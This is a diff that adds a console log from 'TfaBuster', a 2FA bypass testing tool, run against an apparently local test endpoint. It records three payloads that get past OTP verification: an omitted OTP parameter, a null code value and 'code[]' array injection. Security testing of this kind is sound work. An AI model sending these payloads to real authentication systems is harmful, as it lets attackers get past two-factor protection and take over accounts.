@@ -1,0 +1,117 @@
+SessionManager initialized with 0 cookies
+[*] Target: http://localhost:8000/verify-null
+[*] OTP Parameter: code
+SmartRequester initialized for http://localhost:8000/verify-null
+ResponseAnalyzer initialized
+AttackEngine initialized for http://localhost:8000/verify-null
+[*] Establishing baseline with invalid OTP...
+Response: 403 | Length: 42
+Baseline set: Status 403, Length 42
+[+] Baseline established: Status 403, Length 42
+
+[*] Running Logic Bypass Module...
+LogicBypassModule initialized. OTP param: 'code'
+Generated 13 logic bypass payloads
+Response: 200 | Length: 58
+[!] BYPASS DETECTED: Missing OTP Parameter
+    Confidence: HIGH (90%)
+    Reason: Status Code Shift: 403 → 200
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+BYPASS DETECTED: Missing OTP Parameter
+Confidence: HIGH (90%)
+Payload: {}
+Reason: Status Code Shift: 403 → 200
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+Response: 200 | Length: 58
+[!] BYPASS DETECTED: Null OTP Value
+    Confidence: HIGH (90%)
+    Reason: Status Code Shift: 403 → 200
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+BYPASS DETECTED: Null OTP Value
+Confidence: HIGH (90%)
+Payload: {
+  "code": null
+}
+Reason: Status Code Shift: 403 → 200
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+Response: 403 | Length: 42
+Response: 200 | Length: 58
+[!] BYPASS DETECTED: Array Injection (code[])
+    Confidence: HIGH (90%)
+    Reason: Status Code Shift: 403 → 200
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+BYPASS DETECTED: Array Injection (code[])
+Confidence: HIGH (90%)
+Payload: {
+  "code[]": "000000"
+}
+Reason: Status Code Shift: 403 → 200
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+
+[*] Running CSRF/Session Bypass Module...
+CSRFBypassModule initialized
+Generated 8 CSRF/session bypass variants
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+Response: 403 | Length: 42
+
+======================================================================
+SCAN COMPLETE: 3 potential bypasses found out of 3 tests
+======================================================================
+
+Results saved to output/results.json
+
+╔═══════════════════════════════════════════════════════════════╗
+║                       TfaBuster v1.0                          ║
+║           Smart 2FA Bypass Detection Tool                     ║
+║                                                               ║
+║  [!] For authorized security testing only                    ║
+╚═══════════════════════════════════════════════════════════════╝
+    
+
+======================================================================
+
+======================================================================
+SUMMARY
+======================================================================
+Total tests run: 3
+Bypasses detected: 3
+
+[!] POTENTIAL BYPASSES:
+
+  • Missing OTP Parameter
+    Confidence: HIGH (90%)
+    Status: 403 → 200
+
+  • Null OTP Value
+    Confidence: HIGH (90%)
+    Status: 403 → 200
+
+  • Array Injection (code[])
+    Confidence: HIGH (90%)
+    Status: 403 → 200
+
+======================================================================
+[*] Full results saved to: output/results.json
+======================================================================
+
